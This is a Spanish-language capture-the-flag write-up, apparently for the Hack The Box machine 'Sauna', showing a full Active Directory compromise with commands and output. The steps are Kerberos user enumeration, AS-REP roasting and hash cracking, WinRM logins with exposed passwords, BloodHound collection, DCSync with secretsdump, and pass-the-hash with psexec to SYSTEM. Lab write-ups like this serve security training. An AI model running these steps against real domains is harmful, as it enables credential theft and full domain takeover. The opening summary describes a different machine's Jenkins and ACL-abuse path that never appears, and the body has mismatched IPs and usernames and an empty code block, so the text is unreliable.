---
layout      : post
title       : "Maquina Sauna - htb writeup"
author      : Firtsmiracle
image       : assets/images/HTB/htb-writeup-Sauna/sauna.png
category    : [ hackthebox ]
tags        : [ Active Directory, Information Leakage, Kerberos User Enumeration, Kerbrute ASRepRoast Attack (GetNPUsers), Cracking Hashes, System Enumeration, WinPEAS AutoLogon, BloodHound, DCSync Attack, Secretsdump, PassTheHash ]
---

El dia de hoy vamos a resolver `Sauna` de `hackthebox` una maquina `windows` de dificultad `facil`, esta vez nos enfrentamos a un `jenkyll` el cual vamos a explotarlo de dos maneras, la primera a traves de la ejecución de una tarea ejecutada periodicamente y la otra a traves del empleo de un token, despues enumeraremos las reglas de firewall para verificar las restricciones y aprochecharemos el acceso a los archivos del `jenkins` para desencriptar una contraseña que nos permitira conectarnos al sistema. Ya estando dentro luego de realizar una enumeración con `bloodhound`, abusaremos del permiso de `ForceChangedPassword` para cambiar la contraseña de un usuario y una vez como este aprovecharnos de `GenericWrite` para retocar los atributos de otro usuario manipulando el comportamiento de acción a traves del inicio de sesión y migrar a otro usuario para finalmente con el privilegio `WriteOwner` asigarnos el privilegio de `DomainAdmins` y asi obtener acceso completo al sistema.
    
 Maquina bastante interesante.

Comenzamos como es de costumbre creando un directorio con el nombre de la maquina:

```bash
❯ mkdir Sauna
❯ ls

 Sauna
```
Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:

```bash
❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
```

## ENUMERACION [#](#enumeracion) {#enumeracion}
 
Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando `ping`:

```bash
❯ ping -c 1 10.10.10.175
PING 10.10.10.175 (10.10.10.175) 56(84) bytes of data.
64 bytes from 10.10.10.175: icmp_seq=1 ttl=127 time=116 ms

--- 10.10.10.175 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 116.468/116.468/116.468/0.000 ms
```

Vemos que la maquina nos responde, con un ttl de `127` y por proximidad seria correspondiente a una maquina `windows`.

### ESCANEO DE PUERTOS

| Parámetro  |                    Descripción                          |
| -----------|:--------------------------------------------------------|                                           
|[-p-](#enumeracion)      | Escaneamos todos los 65535 puertos.                     |
|[--open](#enumeracion)     | Solo los puertos que estén abiertos.                    |
|[-v](#enumeracion)        | Permite ver en consola lo que va encontrando (verbose). |
|[-oG](#enumeracion)        | Guarda el output en un archivo con formato grepeable para que mediante una funcion de [S4vitar](https://s4vitar.github.io/) nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles |


Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre `openPorts`:

```java
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.175 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-23 19:04 -05
Initiating SYN Stealth Scan at 19:04
Scanning 10.10.10.175 [65535 ports]
Discovered open port 445/tcp on 10.10.10.175
Discovered open port 135/tcp on 10.10.10.175
Discovered open port 53/tcp on 10.10.10.175
Discovered open port 139/tcp on 10.10.10.175
Discovered open port 80/tcp on 10.10.10.175
Discovered open port 464/tcp on 10.10.10.175
Discovered open port 636/tcp on 10.10.10.175
Discovered open port 49667/tcp on 10.10.10.175
Discovered open port 389/tcp on 10.10.10.175
Discovered open port 9389/tcp on 10.10.10.175
Discovered open port 88/tcp on 10.10.10.175
Discovered open port 49673/tcp on 10.10.10.175
Discovered open port 593/tcp on 10.10.10.175
Discovered open port 49674/tcp on 10.10.10.175
Discovered open port 3268/tcp on 10.10.10.175
Discovered open port 5985/tcp on 10.10.10.175
Discovered open port 49676/tcp on 10.10.10.175
Discovered open port 3269/tcp on 10.10.10.175
Discovered open port 49698/tcp on 10.10.10.175
Completed SYN Stealth Scan at 19:04, 26.71s elapsed (65535 total ports)
Nmap scan report for 10.10.10.175
Host is up, received user-set (0.14s latency).
Scanned at 2023-11-23 19:04:29 -05 for 27s
Not shown: 65516 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49673/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49676/tcp open  unknown          syn-ack ttl 127
49698/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.78 seconds
           Raw packets sent: 131064 (5.767MB) | Rcvd: 32 (1.408KB)
```

### ESCANEO DE VERSION Y SERVICIOS

```java
❯ nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49676,49698 10.10.10.175 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-23 19:05 -05
Nmap scan report for 10.10.10.175
Host is up (0.26s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-11-24 07:05:43Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-11-24T07:06:39
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
|_clock-skew: 6h59m58s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 106.74 seconds
```

Entre los puertos abiertos mas relevantes podemos visualizar:

| Puerto | Servicio | Versión |
| ------ | -------- | --------|
| 53     | DNS     | Simple DNS Plus|
| 80     | HTTP     |  Microsoft IIS httpd 10.0|
| 88     | KERBEROS     |  Microsoft Windows Kerberos  |
| 135    | RPC     |  Microsoft Windows RPC|
| 389    | LDAP     | Microsoft Windows Active Directory LDAP |
| 445    | SMB     | ? |
| 3268    | LDAP  |  Microsoft Windows Active Directory LDAP |
| 5985    | WINRM     | Microsoft HTTPAPI httpd 2.0  |



## EXPLOTACION [#](#explotacion) {#explotacion}

Como vemos que el puerto `80` corresponde a un servicio web con `whatweb` vamos a tratar de enumerar las tecnolologias que emplean. 

```bash
❯ whatweb http://10.10.10.175
http://10.10.10.175 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[example@email.com,info@example.com], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.175], Microsoft-IIS[10.0], Script, Title[Egotistical Bank :: Home]
```

Vemos que nos enfrentamos a un `IIS`, y concretamente en la seccion de `about`, podemos ver varios nombres potecialmente a ser usuarios validos.

![](/assets/images/HTB/htb-writeup-Sauna/sauna1.PNG)


Vamos a almacenar los usuarios en un archivo, y como es comun lo haremos bajo la primera inicial del nombre y el apellido, como se muestran a continuación.

```bash

```

Ahora vamos a usar `crackmapexec` para realizar una enumeración por `smb`.

```bash
❯ crackmapexec smb 10.10.10.175
SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
```

y agregaremos el dominio al `/etc/hosts`.

```bash
❯ echo "10.10.10.172 EGOTISTICAL-BANK.LOCAL" >> /etc/hosts
```

Ahora si con `kerbrute` enumeramos los usuarios validos, la herramienta nos muestra que `Fsmith` es valido.

```bash
❯ /opt/kerbrute/kerbrute userenum users --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 11/23/23 - Ronnie Flathers @ropnop

2023/11/23 19:21:18 >  Using KDC(s):
2023/11/23 19:21:18 >  	10.10.10.175:88
2023/11/23 19:21:18 >  [+] VALID USERNAME:	Fsmith@EGOTISTICAL-BANK.LOCAL
2023/11/23 19:21:18 >  Done! Tested 6 usernames (1 valid) in 0.310 seconds
```

Procedemos a usar `GetNPUsers` para ejecutar un `ASRepRoast` y obtener un `TGT`.

```bash
❯ GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -no-pass -usersfile uservalid
Impacket v0.11.0 - Copyright 2023 Fortra

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:34df8e0e65cf634b68d04ae2df6e86d9$831b6eae128953abd71def69f04090582868598f156a6c40de789274d7702adc542d91857ee30ab39d7d280def70a6cc8cbda911a7ab0603e307166770bff2c7f9751b64df908cc27cabc6536f1f5b3e539c9fbc8529ec457308ed1798b9dc3bb86f839d23d0260138e386fb9d8335a7d98652329cb623899c16d1b744846337529b4057017b66ccd9b65035ab8cb619c5e89b0facf8334b75944a40b79c7a7a16c457c639d0801fa2855108b70e896efdf1613c1704583030181459258fedb2ff266fc0700ddded76d05759a8b278539cfb125d39b10e33815e49506ce8f724e6e5473c7e45966ec75bdb0c0d7a78b42a710f387324d32b689a9314c4a1f596
```

y ahora procedemos a crackear el hash con `john` y obtenemos unas credenciales `jsmith:Thestrokes23`.

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Thestrokes23     ($krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL)
1g 0:00:00:06 DONE (2023-11-23 19:39) 0.1477g/s 1556Kp/s 1556Kc/s 1556KC/s Tiffani1432..Thanongsuk_police
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Nos conectamos con `evil-winrm` como el usuario `fsmith` y procedemos a leer la primera flag `user.txt`.

![](/assets/images/HTB/htb-writeup-Sauna/sa1.PNG)


## ELEVACION DE PRIVILEGIOS [#](#elevacion-de-privilegios) {#elevacion-de-privilegios}

Usaremos `ldapdomaindump` para enumerar los usuarios y saber los grupos a los cuales pertenecen.

```bash
❯ python3 /opt/ldapdomaindump/ldapdomaindump -u 'EGOTISTICAL-BANK.LOCAL\fsmith' -p 'Thestrokes23' 10.10.10.175
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
❯ ls
 domain_computers.grep   domain_computers_by_os.html   domain_groups.json   domain_policy.json   domain_trusts.json   domain_users.json            users
 domain_computers.html   domain_groups.grep            domain_policy.grep   domain_trusts.grep   domain_users.grep    domain_users_by_group.html   uservalid
 domain_computers.json   domain_groups.html            domain_policy.html   domain_trusts.html   domain_users.html    hash
```

SI ahora visualizamos vemos en nuestro navegador los grupos pertenecientes.

![](/assets/images/HTB/htb-writeup-Sauna/sauna2.PNG)

Podemos ver que ademas de `fsmith`, el usuario `svc_loanmgr` tambien es parte del grupo `Remote Management Users`.


Ahora para enumerar el sistema ya que estamos como el usuario `fsmith` vamos a usar ha herramienta `winpeas.exe`, la cual podemos obtener del repositorio de `GitHub`.


* [Winpeas.exe](https://github.com/carlospolop/PEASS-ng/releases)


```cmd 
*Evil-WinRM* PS C:\Users\FSmith\Documents> upload /home/fmiracle/machines/Sauna/content/winPEASany.exe
                                        
Info: Uploading /home/fmiracle/machines/Sauna/content/winPEASany.exe to C:\Users\FSmith\Documents\winPEASany.exe
                                        
Data: 3183956 bytes of 3183956 bytes copied
                                        
Info: Upload successful!
```
Despues de ejecutar obtenemos las credenciales del usuario `svc_loanmanager`.

![](/assets/images/HTB/htb-writeup-Sauna/sauna3.PNG)

Ahora podemos conectarnos como el usuario `svc_loanmanager`.

```cmd
❯ evil-winrm -i 10.10.10.175 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> whoami
egotisticalbank\svc_loanmgr
```

Para enumerar el sistema ahora como el usuario actual usaremos `sharphound.ps1`, para ello podemos descargarlo del repositorio en el siguiente enlance:

* [Sharphound.ps1](https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1)


Subimos el script a la maquina victima, importamos y ejecutamos.

```cmd
*Evil-WinRM* PS C:\Windows\Temp\privesc> upload /home/fmiracle/machines/Sauna/content/SharpHound.ps1
                                        
Info: Uploading /home/fmiracle/machines/Sauna/content/SharpHound.ps1 to C:\Windows\Temp\privesc\SharpHound.ps1
                                        
Data: 1744464 bytes of 1744464 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Windows\Temp\privesc> Import-Module .\SharpHound.ps1
*Evil-WinRM* PS C:\Windows\Temp\privesc> Invoke-BloodHound -CollectionMethods All
```

Y traemos el comprimido que nos crea a nuestra maquina.

```cmd
*Evil-WinRM* PS C:\wINDOWS\tEMP\Privesc> download C:\wINDOWS\tEMP\Privesc\20231124015657_BloodHound.zip
                                        
Info: Downloading C:\wINDOWS\tEMP\Privesc\20231124015657_BloodHound.zip to 20231124015657_BloodHound.zip
                                        
Info: Download successful!
```

Subimos el comprimido al `bloodhound`.

![](/assets/images/HTB/htb-writeup-Sauna/sauna4.PNG)

Ahora marcamos al usuario `svc_loanmgr` como `owned`.

![](/assets/images/HTB/htb-writeup-Sauna/sauna5.PNG)

Vemos que el usuario tiene privilegios `GetChangesAll` sobre el dominio.


![](/assets/images/HTB/htb-writeup-Sauna/sauna6.PNG)

Si ahora vemos que podemos hacer con este privilegio, `bloodhound` nos indica que podemos efectuar en `DCSync Attack`.

![](/assets/images/HTB/htb-writeup-Sauna/sauna6.PNG)

Para ello podemos usar `secretsdump` para poder dumpearnos todos los hashes, incluido el del usuario `Administrator`.

![](/assets/images/HTB/htb-writeup-Sauna/sa2.PNG)


Seguidamente podemos aplicar un `pass the hash` con `psexec` y conectarnos como el usuario administrator.

```bash
❯ psexec.py EGOTISTICAL-BANK.LOCAL/Administrator@10.10.10.175 -hashes :823452073d75b9d1cf70ebdf86c7f98e
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on 10.10.10.175.....
[*] Found writable share ADMIN$
[*] Uploading file JfTdhTjz.exe
[*] Opening SVCManager on 10.10.10.175.....
[*] Creating service mLSo on 10.10.10.175.....
[*] Starting service mLSo.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.973]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

FInalmente nos dirigimos al directorio personal del usuario `Administrator` y podemos visualizar la segunda flag `root.txt`.

```cmd
C:\Windows\system32> cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop> type root.txt
3663f10ee0496eaccec1c7a21f3f8faf
```

